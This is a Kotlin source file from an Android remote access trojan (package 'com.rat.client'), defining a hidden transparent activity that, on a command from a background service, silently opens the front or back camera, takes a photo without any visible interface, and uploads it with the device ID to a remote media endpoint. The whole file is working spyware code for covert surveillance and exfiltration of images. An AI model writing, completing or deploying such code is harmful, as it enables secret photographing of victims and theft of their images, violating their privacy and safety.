package com.rat.client

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import android.util.Size
import android.view.Surface
import androidx.appcompat.app.AppCompatActivity
import com.rat.client.utils.ApiClient
import com.rat.client.utils.DeviceInfoUtils
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Hidden transparent activity used for capturing photos silently.
 * Launched by the background service when camera commands are received.
 * Has no visible UI - theme is transparent.
 */
class HiddenCameraActivity : AppCompatActivity() {
    companion object {
        private const val TAG = "HiddenCameraActivity"
    }

    private var handlerThread: HandlerThread? = null
    private var handler: Handler? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d(TAG, "HiddenCameraActivity created")

        val useFront = intent.getBooleanExtra("use_front", false)
        captureAndFinish(useFront)
    }

    private fun captureAndFinish(useFront: Boolean) {
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Camera permission not granted")
            finish()
            return
        }

        handlerThread = HandlerThread("HiddenCameraThread")
        handlerThread?.start()
        handler = Handler(handlerThread!!.looper)

        val outputDir = File(cacheDir, "rat_photos")
        outputDir.mkdirs()
        val outputFile = File(outputDir, "photo_${System.currentTimeMillis()}_${if (useFront) "front" else "back"}.jpg")

        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = getCameraId(cameraManager, useFront)
                ?: run {
                    Log.e(TAG, "No ${if (useFront) "front" else "back"} camera")
                    finish()
                    return
                }

            val reader = ImageReader.newInstance(1280, 720, android.graphics.ImageFormat.JPEG, 2)
            val latch = CountDownLatch(1)

            reader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    try {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        FileOutputStream(outputFile).use { it.write(bytes) }
                        Log.d(TAG, "Photo saved: ${outputFile.absolutePath}")

                        // Upload
                        uploadPhoto(outputFile, useFront)
                    } catch (e: Exception) {
                        Log.e(TAG, "Save error: ${e.message}")
                    } finally {
                        image.close()
                    }
                }
            }, handler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        camera.createCaptureSession(
                            listOf(reader.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    try {
                                        val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                        request.addTarget(reader.surface)
                                        session.capture(request.build(), null, handler)
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Capture error: ${e.message}")
                                        latch.countDown()
                                    }
                                }

                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    latch.countDown()
                                }
                            }, handler
                        )
                    } catch (e: Exception) {
                        latch.countDown()
                    }
                }

                override fun onDisconnected(camera: CameraDevice) { latch.countDown() }
                override fun onError(camera: CameraDevice, error: Int) { latch.countDown() }
            }, handler)

            latch.await(15, TimeUnit.SECONDS)
            reader.close()
        } catch (e: Exception) {
            Log.e(TAG, "Camera error: ${e.message}")
        }

        finish()
    }

    private fun getCameraId(cameraManager: CameraManager, useFront: Boolean): String? {
        for (id in cameraManager.cameraIdList) {
            val facing = cameraManager.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING)
            if (useFront && facing == CameraCharacteristics.LENS_FACING_FRONT) return id
            if (!useFront && facing == CameraCharacteristics.LENS_FACING_BACK) return id
        }
        return null
    }

    private fun uploadPhoto(file: File, isFront: Boolean) {
        try {
            val fields = mapOf(
                "deviceId" to DeviceInfoUtils.getDeviceId(this),
                "fileName" to file.name,
                "mimeType" to "image/jpeg",
                "isVideo" to "false",
            )
            ApiClient.uploadFile(Config.Api.UPLOAD_MEDIA, file, fields)
        } catch (e: Exception) {
            Log.e(TAG, "Upload error: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handlerThread?.quitSafely()
    }
}

